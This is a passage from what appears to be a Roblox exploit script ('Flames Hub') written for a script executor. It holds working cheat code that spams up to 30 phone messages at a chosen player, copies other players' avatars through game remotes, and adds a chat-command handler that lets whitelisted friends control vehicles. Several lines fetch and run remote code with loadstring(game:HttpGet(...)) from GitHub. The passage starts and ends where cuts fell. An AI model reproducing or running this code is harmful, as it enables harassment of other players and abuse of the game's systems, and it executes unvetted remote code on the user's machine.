      search.TextScaled = true
      search.BackgroundTransparency = 1
      search.TextTransparency = 1
      Instance.new("UICorner",search).CornerRadius = UDim.new(0,8)
      tween:Create(search,TweenInfo.new(0.25),{BackgroundTransparency = 0, TextTransparency = 0}):Play()

      local playerscroll = Instance.new("ScrollingFrame")
      playerscroll.Parent = message_menu_frame
      playerscroll.Size = UDim2.new(1,-20,0,140)
      playerscroll.Position = UDim2.new(0,10,0,90)
      playerscroll.CanvasSize = UDim2.new(0,0,0,0)
      playerscroll.ScrollBarThickness = 5
      playerscroll.BackgroundColor3 = Color3.fromRGB(40,40,40)
      playerscroll.BorderSizePixel = 0
      playerscroll.BackgroundTransparency = 1
      Instance.new("UICorner",playerscroll).CornerRadius = UDim.new(0,10)
      tween:Create(playerscroll,TweenInfo.new(0.25),{BackgroundTransparency = 0}):Play()

      local layout = Instance.new("UIListLayout",playerscroll)
      layout.Padding = UDim.new(0,5)
      layout.FillDirection = Enum.FillDirection.Vertical
      layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
      layout.VerticalAlignment = Enum.VerticalAlignment.Top

      local selected = nil

      local function refresh()
         for _,v in ipairs(playerscroll:GetChildren()) do
            if v:IsA("TextButton") then v:Destroy() end
         end
         selected = nil
         local filter = string.lower(search.Text or "")
         for _,plr in ipairs(players:GetPlayers()) do
            if plr ~= players.LocalPlayer then
               if filter == "" or string.find(string.lower(plr.Name), filter, 1, true) then
                  local b = Instance.new("TextButton")
                  b.Parent = playerscroll
                  b.Size = UDim2.new(1,-10,0,30)
                  b.BackgroundColor3 = Color3.fromRGB(55,55,55)
                  b.TextColor3 = Color3.fromRGB(255,255,255)
                  b.Text = plr.Name
                  b.Font = Enum.Font.Gotham
                  b.TextScaled = true
                  b.BorderSizePixel = 0
                  Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)

                  b.MouseButton1Click:Connect(function()
                     if selected == b then
                        b.BackgroundColor3 = Color3.fromRGB(55,55,55)
                        selected = nil
                        return
                     end
                     if selected then
                        selected.BackgroundColor3 = Color3.fromRGB(55,55,55)
                     end
                     selected = b
                     b.BackgroundColor3 = Color3.fromRGB(30,200,80)
                  end)
               end
            end
         end
         playerscroll.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y + 10)
      end

      search:GetPropertyChangedSignal("Text"):Connect(refresh)
      refreshbtn.MouseButton1Click:Connect(refresh)

      if not getgenv()._msgmenu_connections then
         getgenv()._msgmenu_connections = true

         players.PlayerAdded:Connect(refresh)
         players.PlayerRemoving:Connect(refresh)
      end

      task.delay(0.1, refresh)

      local amount = Instance.new("TextBox")
      amount.Parent = message_menu_frame
      amount.Size = UDim2.new(1,-20,0,30)
      amount.Position = UDim2.new(0,10,0,235)
      amount.BackgroundColor3 = Color3.fromRGB(45,45,45)
      amount.TextColor3 = Color3.fromRGB(255,255,255)
      amount.Text = "1"
      amount.PlaceholderText = "Number of messages (max 15)."
      amount.Font = Enum.Font.Gotham
      amount.TextScaled = true
      amount.BackgroundTransparency = 1
      amount.TextTransparency = 1
      Instance.new("UICorner",amount).CornerRadius = UDim.new(0,10)
      tween:Create(amount,TweenInfo.new(0.25),{BackgroundTransparency = 0, TextTransparency = 0}):Play()

      local msgbox = Instance.new("TextBox")
      msgbox.Parent = message_menu_frame
      msgbox.Size = UDim2.new(1,-20,0,40)
      msgbox.Position = UDim2.new(0,10,0,275)
      msgbox.BackgroundColor3 = Color3.fromRGB(45,45,45)
      msgbox.TextColor3 = Color3.fromRGB(255,255,255)
      msgbox.Text = ""
      msgbox.PlaceholderText = "Enter message..."
      msgbox.Font = Enum.Font.Gotham
      msgbox.TextScaled = true
      msgbox.BackgroundTransparency = 1
      msgbox.TextTransparency = 1
      Instance.new("UICorner",msgbox).CornerRadius = UDim.new(0,10)
      tween:Create(msgbox,TweenInfo.new(0.25),{BackgroundTransparency = 0, TextTransparency = 0}):Play()

      local sendbtn = Instance.new("TextButton")
      sendbtn.Parent = message_menu_frame
      sendbtn.Size = UDim2.new(1,-20,0,35)
      sendbtn.Position = UDim2.new(0,10,0,320)
      sendbtn.BackgroundColor3 = Color3.fromRGB(60,120,255)
      sendbtn.TextColor3 = Color3.fromRGB(255,255,255)
      sendbtn.Text = "Send Message"
      sendbtn.Font = Enum.Font.GothamBold
      sendbtn.TextScaled = true
      sendbtn.BorderSizePixel = 0
      sendbtn.BackgroundTransparency = 1
      sendbtn.TextTransparency = 1
      Instance.new("UICorner",sendbtn).CornerRadius = UDim.new(0,10)
      tween:Create(sendbtn,TweenInfo.new(0.25),{BackgroundTransparency = 0, TextTransparency = 0}):Play()

      closebtn.MouseButton1Click:Connect(function()
         tween:Create(message_menu_frame,TweenInfo.new(0.22,Enum.EasingStyle.Quad),{
            Size = UDim2.new(0,350,0,0),
            BackgroundTransparency = 1
         }):Play()
         wait(0.25)
         gui:Destroy()
         getgenv().sendmsgmenu_loaded = false
      end)

      sendbtn.MouseButton1Click:Connect(function()
         if not selected then
            return notify("Warning", "Select a player first!", 5)
         end
         local target = players:FindFirstChild(selected.Text)
         if not target then
            return notify("Warning", "Player not found!", 5)
         end

         local num = tonumber(amount.Text) or 1
         num = math.clamp(num,1,30)

         local raw = msgbox.Text or ""
         if raw == "" then
            return notify("Warning", "Message cannot be empty.", 5)
         end

         local msgs = {}
         if raw:find("||",1,true) then
            for part in string.gmatch(raw,"([^|]+)") do
               part = part:gsub("^%s+",""):gsub("%s+$","")
               if part ~= "" then table.insert(msgs,part) end
            end
         else
            table.insert(msgs,raw)
         end

         getgenv().Send_Message_Main_Phone_Messages_Module_Task = getgenv().Send_Message_Main_Phone_Messages_Module_Task or task.spawn(function()
            for i=1,num do
               local text = msgs[((i-1)%#msgs)+1]
               pcall(function()
                  send_msg_phone(target,text)
               end)
               wait(0.02)
            end
         end)
      end)
   end

   getgenv().lock_vehicle = getgenv().lock_vehicle or function(Vehicle)
      getgenv().Get("lock_vehicle", Vehicle)
   end

   if not getgenv().HasSeen_Loading_Screen then
      loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/startIntroFadeScreen"))()

      getgenv().HasSeen_Loading_Screen = true
   end

   getgenv().player_admins = getgenv().player_admins or {}
   getgenv().friend_checked = getgenv().friend_checked or {}
   getgenv().cmds_loaded_plr = getgenv().cmds_loaded_plr or {}
   getgenv().Rainbow_Vehicles = getgenv().Rainbow_Vehicles or {}
   getgenv().Locked_Vehicles = getgenv().Locked_Vehicles or {}
   getgenv().Unlocked_Vehicles = getgenv().Unlocked_Vehicles or {}
   getgenv().Rainbow_Tasks = getgenv().Rainbow_Tasks or {}
   g.Rainbow_Delays         = g.Rainbow_Delays         or {}
   g.Rainbow_Indices        = g.Rainbow_Indices        or {}
   g.Rainbow_Next           = g.Rainbow_Next           or {}
   g.Rainbow_CachedVehicle  = g.Rainbow_CachedVehicle  or {}
   g.Rainbow_ActiveCount    = g.Rainbow_ActiveCount    or 0
   g.Rainbow_MIN_DELAY      = g.Rainbow_MIN_DELAY      or 0.04
   g.Rainbow_Colors = g.Rainbow_Colors or {
      Color3.fromRGB(255,255,255), Color3.fromRGB(128,128,128), Color3.fromRGB(0,0,0),
      Color3.fromRGB(0,0,255),     Color3.fromRGB(0,255,0),     Color3.fromRGB(0,255,255),
      Color3.fromRGB(255,165,0),   Color3.fromRGB(139,69,19),   Color3.fromRGB(255,255,0),
      Color3.fromRGB(50,205,50),   Color3.fromRGB(255,0,0),     Color3.fromRGB(255,155,172),
      Color3.fromRGB(128,0,128),
   }

   getgenv().alreadyCheckedUser = function(player)
      if not getgenv().friend_checked[player.Name] then
         getgenv().player_admins[player.Name] = player
      end
      if not getgenv().friend_checked[player.Name] then
         getgenv().friend_checked[player.Name] = player
      end
      if not getgenv().cmds_loaded_plr[player.Name] then
         getgenv().cmds_loaded_plr[player.Name] = player
      end
   end

   getgenv().disable_rgb_for = function(plr)
      if not plr then
         return getgenv().notify("Error", "Player was not found when trying to disable RGB vehicle!", 6)
      end

      local name = plr.Name
      local state = getgenv().VehicleStates[name]
      if not state then
         if getgenv().Rainbow_Tasks[name] then
            getgenv().Rainbow_Tasks[name] = nil
         end
         if getgenv().Rainbow_Indices[name] then
            getgenv().Rainbow_Indices[name] = nil
         end
         return
      end

      local handle = getgenv().Rainbow_Tasks[name]
      if handle then
         task.cancel(handle)
      end

      if getgenv().Rainbow_Tasks[name] then
         getgenv().Rainbow_Tasks[name] = nil
      end
      if getgenv().Rainbow_Indices[name] then
         getgenv().Rainbow_Indices[name] = nil
      end
      state.rainbow = false
      state.rainbowIndex = nil

      getgenv().notify("Success", "Disabled Rainbow Vehicle for: "..tostring(name), 6)
   end

   if not getgenv().fully_disable_rgb_plr then
      getgenv().fully_disable_rgb_plr = disable_rgb_for
   end
   fw(0.1)
   getgenv().enable_rgb_for = function(plr)
      if not plr then return end

      local name = plr.Name
      getgenv().VehicleStates[name] = getgenv().VehicleStates[name] or {}
      local state = getgenv().VehicleStates[name]

      local vehicle = get_other_vehicle(plr)
      if not vehicle then
         state.rainbow = false
         state.rainbowIndex = nil
         getgenv().Rainbow_Tasks[name] = nil
         getgenv().Rainbow_Indices[name] = nil
         return false, "you don't have a vehicle"
      end

      if getgenv().Rainbow_Tasks[name] then
         disable_rgb_for(plr)
      end

      state.rainbow = true
      state.rainbowIndex = 0
      getgenv().Rainbow_Indices[name] = 0

      getgenv().Rainbow_Tasks[name] = task.spawn(function()
         while state.rainbow do
            local v = get_other_vehicle(plr)
            if not v then
               state.rainbow = false
               state.rainbowIndex = nil
               getgenv().Rainbow_Tasks[name] = nil
               getgenv().Rainbow_Indices[name] = nil
               break
            end

            local i = (state.rainbowIndex or 0) + 1
            state.rainbowIndex = i
            local color = g.Rainbow_Colors[(i % #g.Rainbow_Colors) + 1]
            change_vehicle_color(color, v)
            fw(0.2)
         end
      end)
   end

   -- [[ I promise I'll use it later, I know, it's better. ]] --
   getgenv().find_configuration_manager_GUI = function()
      local find_GUI_main = CoreGui:FindFirstChild("FlamesAdminGUI", true)
      if find_GUI_main then return find_GUI_main end

      for _, v in ipairs(CoreGui:GetDescendants()) do
         if v:IsA("ScreenGui") and v.Name:lower():find("flames") and v.Name:lower():find("admin") then
            return v
         end
      end
   end

   getgenv().toggle_config_manager = function(state)
      if state == true then
         if not CoreGui:FindFirstChild("FlamesAdminGUI", true) then
            return notify("Error", "Configuration Manager GUI was not found.", 6)
         end

         if CoreGui:FindFirstChild("FlamesAdminGUI", true) then
            CoreGui:FindFirstChild("FlamesAdminGUI", true).Enabled = true
         elseif CoreGui:FindFirstChild("FlamesAdminGUI", true) and CoreGui:FindFirstChild("FlamesAdminGUI", true).Enabled then
            return 
         end
      elseif state == false then
         if not CoreGui:FindFirstChild("FlamesAdminGUI", true) then
            return notify("Error", "Configuration Manager GUI was not found.", 6)
         end

         if CoreGui:FindFirstChild("FlamesAdminGUI", true) then
            CoreGui:FindFirstChild("FlamesAdminGUI", true).Enabled = false
         elseif CoreGui:FindFirstChild("FlamesAdminGUI", true) and CoreGui:FindFirstChild("FlamesAdminGUI", true).Enabled then
            return 
         end
      else
         return 
      end
   end

   getgenv().set_rgb_delay = function(name, newDelay)
      if type(newDelay) ~= "number" then return false, "invalid time value" end
      if newDelay < g.Rainbow_MIN_DELAY then newDelay = g.Rainbow_MIN_DELAY end
      g.Rainbow_Delays[name] = newDelay
      g.Rainbow_Next[name] = 0
      return true
   end

   getgenv().VehicleStates = getgenv().VehicleStates or {}

   if not getgenv().PreRequisites_Loaded then
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/FlamesHub_OldAPI_Runtime_Functions/refs/heads/main/other_actors.lua'))()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/FlamesHub_OldAPI_Runtime_Functions/refs/heads/main/TextChatServce.lua'))()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/FlamesHub_OldAPI_Runtime_Functions/refs/heads/main/error_handler.lua'))()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/FlamesHub_OldAPI_Runtime_Functions/refs/heads/main/feedback_handler.lua'))()
      fw(0.1)
      getgenv().PreRequisites_Loaded = true
   end

   getgenv().setup_cmd_handler_plr = function(player)
      local TextChatService = getgenv().TextChatService
      local prefix = ";"
      local localPlayerName = getgenv().LocalPlayer.Name
      local channel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
      local function trim(str)
         return str:match("^%s*(.-)%s*$")
      end

      local function chat_reply(speakerName, msg)
         local channel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
         
         channel:SendAsync("/w " .. speakerName .. " " .. msg .. " (this message was automatically sent)")
      end

      TextChatService.MessageReceived:Connect(function(chatMessage)
         local speaker = chatMessage.TextSource
         if not (speaker and speaker.Name ~= localPlayerName and getgenv().player_admins[speaker.Name]) then return end
         local normalizedMessage = trim(chatMessage.Text:lower())
         if normalizedMessage:sub(1, #prefix) ~= prefix then return end
         local command = normalizedMessage:sub(#prefix + 1)
         local playerVehicle = get_other_vehicle(getgenv().Players[speaker.Name])
         if not getgenv().Players[speaker.Name]:IsFriendsWith(getgenv().LocalPlayer.UserId) then return end
         local Name = speaker and speaker.Name
         getgenv().VehicleStates[Name] = getgenv().VehicleStates[Name] or {
            locked = false,
            unlocked = false,
            rainbow = false,
         }
         local parts = command:split(" ")
         local cmd = parts[1]

         if levenshtein(cmd, "rgbcar") <= 1 then
            local Player = getgenv().Players[speaker.Name]
            if not Player then
               return notify("Error", "This player does not exist!", 5)
            end

            local vehicle = get_other_vehicle(Player)
            if not vehicle then
               getgenv().Rainbow_Vehicles[Player.Name] = nil
               return notify("Error", "The player doesn't have a car spawned!", 5)
            end

            enable_rgb_for(Player)
         elseif levenshtein(command:split(" ")[1], "rgbtime") <= 2 then
            local parts = command:split(" ")
            local delayStr = parts[2]
            local newDelay = tonumber(delayStr)

            if not newDelay then
               return 
            end

            if newDelay < 0.1 then
               newDelay = 0.1
            end

            local name = getgenv().Players[speaker.Name].Name
            g.Rainbow_Delays[name] = newDelay
            g.Rainbow_Next[name] = time()
         elseif levenshtein(command, "norgbcar") <= 2 then
            disable_rgb_for(getgenv().Players[speaker.Name])
         elseif levenshtein(command, "lockcar") <= 2 then
            if not playerVehicle then
               getgenv().LockLoop_Vehicles[speaker.Name] = false
               return 
            end
            if getgenv().Locked_Vehicles[speaker.Name] then
               return 
            end

            getgenv().Unlocked_Vehicles[speaker.Name] = false
            fw(0.1)
            getgenv().Locked_Vehicles[speaker.Name] = true

            local player = getgenv().Players[speaker.Name]
            if not player then
               getgenv().Locked_Vehicles[speaker.Name] = false
            end

            local v = get_other_vehicle(player)

            if v and not v:GetAttribute("locked") then
               getgenv().Get("lock_vehicle", v)
            elseif not v then
               getgenv().Locked_Vehicles[speaker.Name] = false
            end
         elseif levenshtein(command, "unlockcar") <= 2 then
            if not playerVehicle then
               getgenv().Unlocked_Vehicles[speaker.Name] = false
               return 
            end

            if getgenv().Unlocked_Vehicles[speaker.Name] then
               return 
            end

            getgenv().Locked_Vehicles[speaker.Name] = false
            fw(0.1)
            getgenv().Unlocked_Vehicles[speaker.Name] = true

            local player = getgenv().Players[speaker.Name]
            if not player then
               getgenv().Unlocked_Vehicles[speaker.Name] = false
            end

            local v = get_other_vehicle(player)
            if v and v:GetAttribute("locked") then
               getgenv().Get("lock_vehicle", v)
            elseif not v then
               getgenv().Unlocked_Vehicles[speaker.Name] = false
            end
         elseif levenshtein(command, "trailer") <= 2 then
            local player = getgenv().Players[speaker.Name]

            if not playerVehicle then
               getgenv().Unlocked_Vehicles[speaker.Name] = false
               return 
            end

            local Vehicle = get_other_vehicle(player)

            if not Vehicle then
               return 
            end

            if Vehicle:FindFirstChild("WaterSkies") then
               return 
            end
            fw(0.1)
            water_skie_trailer(true, Vehicle)
         elseif levenshtein(command, "notrailer") <= 2 then
            local player = getgenv().Players[speaker.Name]

            if not playerVehicle then
               getgenv().Unlocked_Vehicles[speaker.Name] = false
               return 
            end

            local Vehicle = get_other_vehicle(player)

            if not Vehicle then
               return 
            end

            if not Vehicle:FindFirstChild("WaterSkies") then
               return 
            end

            water_skie_trailer(false, Vehicle)
         elseif command:sub(1, 5) == "check" then
            if getgenv().Check_Cooldown then return end

            getgenv().Check_Cooldown = true
            task.delay(15, function()
               getgenv().Check_Cooldown = false
            end)

            local args = command:split(" ")
            local checkTargetName = args[2]
            if not checkTargetName or #checkTargetName <= 0 then
               return warn("Target player invalid: "..tostring(checkTargetName))
            end

            local target = findplr(checkTargetName)
            if not target then
               return warn("Could not find: "..tostring(target))
            end

            local isVerified = target:GetAttribute("is_verified")
            local generalChannel = getgenv().TextChatService:FindFirstChild("RBXGeneral", true) or getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
            if generalChannel then
               if isVerified == true then
                  generalChannel:SendAsync("Player: " .. target.DisplayName .. " has premium.")
               else
                  generalChannel:SendAsync("Player: " .. target.DisplayName .. " does not have premium.")
               end
            end
         elseif levenshtein(command, "cmds") <= 2 then
            if getgenv().Is_OnCooldown then return end

            getgenv().Is_OnCooldown = true
            getgenv().Wait_Time_Cooldown = 45
            getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync(
               ";lockcar | ;rgbcar | ;norgbcar | ;unlockcar | ;check Player | ;trailer | ;notrailer"
            )

            task.delay(getgenv().Wait_Time_Cooldown, function()
               getgenv().Is_OnCooldown = false
            end)
         end
      end)
   end

   getgenv().addPlayerToScriptWhitelistTable = function(player)
      if not getgenv().player_admins[player.Name] then
         getgenv().player_admins[player.Name] = player
         fw(0.2)
         if getgenv().player_admins[player.Name] then
            notify("Success", tostring(player.Name)..", was added to Admins Whitelist.", 3)
         end
      end
   end

   getgenv().removePlayerFromScriptWhitelistTable = function(player)
      if getgenv().player_admins[player.Name] then
         getgenv().player_admins[player.Name] = nil
         fw(0.1)
         if getgenv().player_admins[player.Name] == nil then
            notify("Success", tostring(player.Name).." was removed from the Admins Whitelist!", 3)
         else
            return notify("Error", tostring(player)..", does not exist.", 5)
         end
      end
   end

   getgenv().avgSkin = function(bc)
      local colors = {
         bc.HeadColor3,
         bc.LeftArmColor3,
         bc.RightArmColor3,
         bc.TorsoColor3,
         bc.LeftLegColor3,
         bc.RightLegColor3
      }

      local r,g,b = 0,0,0

      for _,c in ipairs(colors) do
         r = r + c.R
         g = g + c.G
         b = b + c.B
      end

      return Color3.new(r/6,g/6,b/6)
   end
   wait()
   getgenv().clear_avatar = function()
      local args = {
         "wear_outfit_from_desc",
         {
            accessories = {
               {
                  Rotation = "  ",
                  AccessoryType = "Hair",
                  Position = "  ",
                  Scale = "1 1 1",
                  IsLayered = false,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "Face",
                  Position = "  ",
                  Scale = "1 1 1",
                  IsLayered = false,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "Face",
                  Position = "  ",
                  Scale = "1 1 1",
                  IsLayered = false,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "Hat",
                  Position = "  ",
                  Scale = "1 1 1",
                  IsLayered = false,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "Face",
                  Position = "  ",
                  Scale = "1 1 1",
                  IsLayered = false,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "Shirt",
                  Scale = "1 1 1",
                  Position = "  ",
                  Order = 1,
                  IsLayered = true,
                  Puffiness = 0,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "DressSkirt",
                  Scale = "1 1 1",
                  Position = "  ",
                  Order = 2,
                  IsLayered = true,
                  Puffiness = 0,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "RightShoe",
                  Scale = "1 1 1",
                  Position = "  ",
                  Order = 3,
                  IsLayered = true,
                  Puffiness = 0,
                  AssetId = 0
               },
               {
                  Rotation = "  ",
                  AccessoryType = "LeftShoe",
                  Scale = "1 1 1",
                  Position = "  ",
                  Order = 4,
                  IsLayered = true,
                  Puffiness = 0,
                  AssetId = 0
               }
            },
            properties = {
               SwimAnimation = 0,
               RightLegColor = "^zH;",
               MoodAnimation = 0,
               Torso = 0,
               WidthScale = 1,
               BodyTypeScale = 0.25,
               ClimbAnimation = 0,
               LeftArmColor = "^zH;",
               Shirt = 0,
               GraphicTShirt = 0,
               RightArmColor = "^zH;",
               LeftArm = 0,
               RunAnimation = 0,
               JumpAnimation = 0,
               RightArm = 0,
               Face = 0,
               Head = 0,
               DepthScale = 1,
               LeftLegColor = "^zH;",
               FallAnimation = 0,
               Pants = 0,
               HeadColor = "^zH;",
               TorsoColor = "^zH;",
               IdleAnimation = 0,
               RightLeg = 0,
               HeadScale = 1,
               HeightScale = 1,
               ProportionScale = 0,
               LeftLeg = 0
            }
         }
      }

      pcall(function()
         getgenv().Send(unpack(args))
      end)
   end
   fw(0.2)
   getgenv().height_setter_busy = getgenv().height_setter_busy or false
   getgenv().session_original_height = getgenv().session_original_height or nil
   getgenv().session_original_width = getgenv().session_original_width or nil
   getgenv().session_original_skin = getgenv().session_original_skin or nil
   getgenv().session_active = getgenv().session_active or false
   getgenv().last_height_scale = getgenv().last_height_scale or nil
   getgenv().prev_height_scale = getgenv().prev_height_scale or nil
   getgenv().last_skin_tone = getgenv().last_skin_tone or nil
   getgenv().prev_skin_tone = getgenv().prev_skin_tone or nil
   getgenv().apply_skin_tone = function(color) if not color then return end pcall(function() getgenv().Send("skin_tone", color) end) end
   getgenv().height_func_setter = function(height_input)
      if getgenv().height_setter_busy then return end
      getgenv().height_setter_busy = true

      local player = getgenv().LocalPlayer
      local char = getgenv().Character or player and player.Character
      local hum = getgenv().Humanoid or char and char:FindFirstChildOfClass("Humanoid")

      if not hum then
         getgenv().height_setter_busy = false
         return
      end

      local desc = hum:GetAppliedDescription()
      if not desc then
         getgenv().height_setter_busy = false
         return getgenv().notify("Error","Failed to grab HumanoidDescription.",6)
      end

      local bodyColors = char and char:FindFirstChildOfClass("BodyColors")
      local current_skin = bodyColors and avgSkin(bodyColors)

      if not getgenv().session_active then
         getgenv().session_original_height = desc.HeightScale or 1
         getgenv().session_original_width = desc.WidthScale or 1
         getgenv().session_original_skin = current_skin
         getgenv().session_active = true
      end

      if current_skin then
         getgenv().prev_skin_tone = getgenv().last_skin_tone or current_skin
         getgenv().last_skin_tone = current_skin
      end

      local height = tonumber(height_input) or desc.HeightScale or 1

      getgenv().prev_height_scale = getgenv().last_height_scale or desc.HeightScale or 1
      getgenv().last_height_scale = height

      local properties = {
         Head = desc.Head or 0,
         Torso = desc.Torso or 0,
         LeftArm = desc.LeftArm or 0,
         RightArm = desc.RightArm or 0,
         LeftLeg = desc.LeftLeg or 0,
         RightLeg = desc.RightLeg or 0,
         Face = desc.Face or 0,
         Shirt = desc.Shirt or 0,
         Pants = desc.Pants or 0,
         GraphicTShirt = desc.GraphicTShirt or 0,

         RunAnimation = desc.RunAnimation or 0,
         WalkAnimation = desc.WalkAnimation or 0,
         JumpAnimation = desc.JumpAnimation or 0,
         FallAnimation = desc.FallAnimation or 0,
         ClimbAnimation = desc.ClimbAnimation or 0,
         IdleAnimation = desc.IdleAnimation or 0,
         SwimAnimation = desc.SwimAnimation or 0,

         HeightScale = height,
         WidthScale = desc.WidthScale or 1,
         DepthScale = desc.DepthScale or 1,
         HeadScale = desc.HeadScale or 1,
         BodyTypeScale = desc.BodyTypeScale or 0,
         ProportionScale = desc.ProportionScale or 0,
      }

      local accessories = {}

      for _, acc in ipairs(desc:GetAccessories(true)) do
         table.insert(accessories,{
            Rotation = "  ",
            Position = "  ",
            Scale = "1 1 1",
            IsLayered = acc.IsLayered,
            AccessoryType = acc.AccessoryType.Name,
            AssetId = acc.AssetId,
            Order = acc.Order,
            Puffiness = acc.Puffiness
         })
      end

      pcall(function()
         getgenv().Send("wear_outfit_from_desc", {
            accessories = accessories,
            properties = properties
         })
      end)

      task.delay(0.10, function()
         getgenv().apply_skin_tone(getgenv().session_original_skin)
         getgenv().height_setter_busy = false
      end)
   end

   -- [[ Say wassup to our new *INSTANT* copier system! ]] --
   getgenv().copy_plr_avatar = function(Player)
      if getgenv().is_copying_avatar_already_flames then
         return notify("Warning","Avatar copier already in progress!",6)
      end
      getgenv().is_copying_avatar_already_flames = true

      if not Player or not Player.Character then
         getgenv().is_copying_avatar_already_flames = false
         return notify("Warning","Target not found!",5)
      end

      local hum = Player.Character:FindFirstChildWhichIsA("Humanoid") or get_human(Player, 3)
      if not hum then
         getgenv().is_copying_avatar_already_flames = false
         return notify("Warning","No humanoid!",5)
      end

      local desc = hum:GetAppliedDescription()
      if not desc then
         getgenv().is_copying_avatar_already_flames = false
         return notify("Warning","No description!",5)
      end

      if Player.Name == "CIippedByAura" or Player.Name == "L0CKED_1N1" then
         getgenv().is_copying_avatar_already_flames = false
         return notify("Warning", "Do not copy the owner of Flames Hub's avatar!", 10)
      end

      local bio = Player:GetAttribute("bio")

      if bio and bio == "Flames Hub Anti Stealer Is Enabled." then
         return getgenv().notify("Warning", "This Player has Anti Outfit Stealer enabled!", 7)
      end
      fw(0.2)
      getgenv().clear_avatar()
      fw(0.2)
      local accessories = {}

      for _,acc in ipairs(desc:GetAccessories(true)) do
         table.insert(accessories,{
            Rotation = "  ",
            Position = "  ",
            Scale = "1 1 1",
            IsLayered = acc.IsLayered,
            AccessoryType = acc.AccessoryType.Name,
            AssetId = acc.AssetId,
            Order = acc.Order,
            Puffiness = acc.Puffiness
         })
      end

      local properties = {
         Head = desc.Head or 0,
         Torso = desc.Torso or 0,
         LeftArm = desc.LeftArm or 0,
         RightArm = desc.RightArm or 0,
         LeftLeg = desc.LeftLeg or 0,
         RightLeg = desc.RightLeg or 0,
         Face = desc.Face or 0,
         Shirt = desc.Shirt or 0,
         Pants = desc.Pants or 0,
         GraphicTShirt = desc.GraphicTShirt or 0,

         RunAnimation = desc.RunAnimation or 0,
         WalkAnimation = desc.WalkAnimation or 0,
         JumpAnimation = desc.JumpAnimation or 0,
         FallAnimation = desc.FallAnimation or 0,
         ClimbAnimation = desc.ClimbAnimation or 0,
         IdleAnimation = desc.IdleAnimation or 0,
         SwimAnimation = desc.SwimAnimation or 0,

         HeightScale = desc.HeightScale or 1,
         WidthScale = desc.WidthScale or 1,
         DepthScale = desc.DepthScale or 1,
         HeadScale = desc.HeadScale or 1,
         BodyTypeScale = desc.BodyTypeScale or 0,
         ProportionScale = desc.ProportionScale or 0,
      }

      local args = {
         "wear_outfit_from_desc",
         {
            accessories = accessories,
            properties = properties
         }
      }

      pcall(function() getgenv().Send(unpack(args)) end)
      fw(0.1)
      local bodyColors = Player.Character:FindFirstChildOfClass("BodyColors")
      if Player.Character and bodyColors then
         getgenv().Send("skin_tone", avgSkin(bodyColors))
      end

      local height = math.clamp(math.floor((desc.HeightScale or 1)*100+0.5),90,105)
      local width  = math.clamp(math.floor((desc.WidthScale  or 1)*100+0.5),70,100)

      getgenv().Send("body_scale","HeightScale",height)
      task.wait(0.15)
      getgenv().Send("body_scale","WidthScale",width)

      local age = Player:GetAttribute("age")
      if age then
         getgenv().Get("age",age)
      end

      notify("Success","Copied avatar from "..Player.Name,5)
      getgenv().is_copying_avatar_already_flames = false
   end

   getgenv().height_func_setter = function(height_input)
      if getgenv().height_setter_busy then return end
      getgenv().height_setter_busy = true

      local player = getgenv().LocalPlayer
      local char = getgenv().Character or player and player.Character
      local hum = getgenv().Humanoid or char and char:FindFirstChildOfClass("Humanoid")

      if not hum then
         getgenv().height_setter_busy = false
         return
      end

      local desc = hum:GetAppliedDescription()
      if not desc then
         getgenv().height_setter_busy = false
         return getgenv().notify("Error","Failed to grab HumanoidDescription.",6)
      end

      local bodyColors = char and char:FindFirstChildOfClass("BodyColors")
      local current_skin = bodyColors and avgSkin(bodyColors)

      if not getgenv().session_active then
         getgenv().session_original_height = desc.HeightScale or 1
         getgenv().session_original_width = desc.WidthScale or 1
         getgenv().session_original_skin = current_skin
         getgenv().session_active = true
      end

      if current_skin then
         getgenv().prev_skin_tone = getgenv().last_skin_tone or current_skin
         getgenv().last_skin_tone = current_skin
      end

      local height = tonumber(height_input) or desc.HeightScale or 1

      getgenv().prev_height_scale = getgenv().last_height_scale or desc.HeightScale or 1
      getgenv().last_height_scale = height

      local properties = {
         Head = desc.Head or 0,
         Torso = desc.Torso or 0,
         LeftArm = desc.LeftArm or 0,
         RightArm = desc.RightArm or 0,
         LeftLeg = desc.LeftLeg or 0,
         RightLeg = desc.RightLeg or 0,
         Face = desc.Face or 0,
         Shirt = desc.Shirt or 0,
         Pants = desc.Pants or 0,
         GraphicTShirt = desc.GraphicTShirt or 0,

         RunAnimation = desc.RunAnimation or 0,
         WalkAnimation = desc.WalkAnimation or 0,
         JumpAnimation = desc.JumpAnimation or 0,
         FallAnimation = desc.FallAnimation or 0,
         ClimbAnimation = desc.ClimbAnimation or 0,
         IdleAnimation = desc.IdleAnimation or 0,
         SwimAnimation = desc.SwimAnimation or 0,

         HeightScale = height,
         WidthScale = desc.WidthScale or 1,
         DepthScale = desc.DepthScale or 1,
         HeadScale = desc.HeadScale or 1,
         BodyTypeScale = desc.BodyTypeScale or 0,
         ProportionScale = desc.ProportionScale or 0,
      }

      local accessories = {}

      for _, acc in ipairs(desc:GetAccessories(true)) do
         table.insert(accessories,{
            Rotation = "  ",
            Position = "  ",
            Scale = "1 1 1",
            IsLayered = acc.IsLayered,
            AccessoryType = acc.AccessoryType.Name,
            AssetId = acc.AssetId,
            Order = acc.Order,
            Puffiness = acc.Puffiness
         })
      end

